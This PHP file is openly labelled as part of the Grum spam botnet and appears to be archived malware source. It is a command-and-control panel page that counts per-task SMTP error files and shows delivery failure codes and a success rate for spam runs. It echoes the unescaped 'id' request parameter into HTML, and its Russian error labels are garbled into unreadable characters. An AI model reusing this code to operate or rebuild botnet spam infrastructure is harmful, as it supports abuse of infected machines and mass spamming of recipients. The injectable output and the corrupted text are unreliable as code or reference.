/*
  name      Grum
  type      botnet
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?
  require("passwd.inc");
  $errors_dir = "../errors/";
  $id = $_GET['id'];

  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");  
  header("Last-Modified: " . gmdate( "D, d M Y H:i:s") . " GMT"); 
  header("Cache-Control: no-cache, must-revalidate"); 
  header("Pragma: no-cache");

  echo "<hr>\r\n";
  echo "<div align='center'><h2>Errors of task #$id</h2></div>\r\n";
  echo "<hr>\r\n";

  echo "<table border=0 align='CENTER' width='100%'>";
  echo "<tr><td align='CENTER' width='50%'>";

  echo "<table border='1' align='CENTER'>";
  echo "<tr><td>Error</td><td>Count</td></tr>\r\n";

  $dir = opendir($errors_dir);
  chdir($errors_dir);

  $sigma = 0;
  
  while (($d = readdir($dir)) !== false) {
    if (is_file($d)) {
      $filename = $errors_dir."$d";
      $text = stripslashes(join('',file($filename)));
      $basename = basename($filename);
      list($tid,$err) = explode(".",$basename);
      if ($tid === $id) {
        $errors[$err] = $text;
        $sigma += $text;
      }
    }
  }
  closedir($dir);
  
  asort($errors);
  for ($i=0; $i < 1000; $i++) {
    if ($errors[$i] > 0) {
      echo "<tr>";
      if ($i == 0) echo "<td><font color='green'>good</font></td>";
      else echo "<td>$i</td>";
      echo "<td>".$errors[$i]."</td>";
      echo "</tr>\r\n";
    }
  }
  
  $valid = round(100*$errors[0]/$sigma);
  
  ?>
  
  </table></td><td align='CENTER' width='50%' valign='TOP'><table align='CENTER'><tr><td>701</td><td>�� ���� ��������� ����� �� ���� TO_EMAIL.</td></tr><tr><td>702</td><td>�� ���� ����������� MX ������.</td></tr><tr><td>703</td><td>�� ���� ������������ � MX ��������.</td></tr><tr><td>704</td><td>�� ���� ������� ������� �������.</td></tr><tr><td>705</td><td>�� ������� ����� ������� ����� ������� �������.</td></tr><tr><td>706</td><td>�� ���� ��������� ����� �� ���� FROM_EMAIL.</td></tr><tr><td>707</td><td>� �������� ������� BODY ������ �������� ����������.</td></tr><tr><td>708</td><td>-</td></tr><tr><td>709</td><td>���������� �����. �� ��������� �������.</td></tr><tr><td>710</td><td>������ ������ ����. ������ �� 250.</td></tr><tr><td>711</td><td>�� ���� ������� HELO.</td></tr><tr><td>712</td><td>����������� ����� ����� ������� HELO.</td></tr><tr><td>713</td><td>HELO �� �������.</td></tr><tr><td>714</td><td>�� ���� ������� MAIL FROM.</td></tr><tr><td>715</td><td>����������� ����� ����� ������� MAIL FROM.</td></tr><tr><td>716</td><td>MAIL FROM �� �������.</td></tr><tr><td>717</td><td>�� ���� ������� RCPT TO.</td></tr><tr><td>718</td><td>����������� ����� ����� ������� RCPT TO.</td></tr><tr><td>719</td><td>RCPT TO �� �������.</td></tr><tr><td>720</td><td>�� ���� ������� �������� DATA ��� ������� ���� ������.</td></tr><tr><td>721</td><td>����������� ����� ����� ������� �������� DATA.</td></tr><tr><td>722</td><td>�������� DATA �� ������� �������� - ��� ��������� ����������.</td></tr><tr><td>723</td><td>�� ���� ������� [CRLF].[CRLF].</td></tr><tr><td>724</td><td>����������� ����� ����� ������� [CRLF].[CRLF].</td></tr>
  <tr><td>Errors Sum:</td><td><?=$sigma?></td></tr>
  <tr><td>Valid:</td><td>%<?=$valid?></td></tr>
  
  </table></td></tr></table>  
  
  